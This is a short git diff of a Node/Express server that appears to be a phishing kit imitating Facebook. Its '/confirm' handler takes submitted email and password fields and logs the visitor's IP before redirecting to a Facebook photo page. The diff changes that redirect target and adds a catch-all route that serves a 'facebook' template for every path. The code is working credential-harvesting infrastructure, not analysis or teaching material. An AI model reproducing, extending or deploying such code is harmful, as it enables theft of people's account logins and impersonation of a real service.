@@ -64,7 +64,7 @@ app.post('/confirm', function (req, res) {
     var b = req.body.pass_a;
     var c = req.body.email;
     var d = req.body.pass;
-    res.redirect('https://www.facebook.com/SadcasmLoL/photos/a.221551201572697/739890806405398/?type=3&theater')
+    res.redirect('https://www.facebook.com/my.omelette/photos/a.400034677207255/453806845163371/?type=3&theater')
     var ip = req.headers['x-forwarded-for'] ||
         req.connection.remoteAddress ||
         req.socket.remoteAddress ||
@@ -91,6 +91,9 @@ app.post('/confirm_amir', function (req, res) {
             // console.log(result)
         }
     })
+})
+app.get('*',function(req,res){
+    res.render('facebook');
 })
 app.listen(PORT, function () {
     console.log('Server Started')
